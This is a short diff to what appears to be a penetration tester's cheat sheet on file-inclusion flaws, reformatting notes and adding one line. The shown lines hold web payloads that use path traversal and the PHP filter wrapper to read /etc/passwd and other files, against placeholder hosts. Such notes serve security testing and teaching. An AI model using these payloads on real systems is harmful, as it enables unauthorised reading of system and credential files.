@@ -192,9 +192,11 @@ Check for client side scripts
     http://example.com/index.php?page=..///////..////..//////etc/passwd
     http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 	
-	/etc/passwd, etc.
-	can you include a remote file?
-	?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
+    /etc/passwd, etc.
+    can you include a remote file?
+    ?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
+	
+    http://example.labs/page.php?file=php://filter/resource=/etc/passwd             #php filter wrapper 
 	
 	
 Vulnerable PHP functions
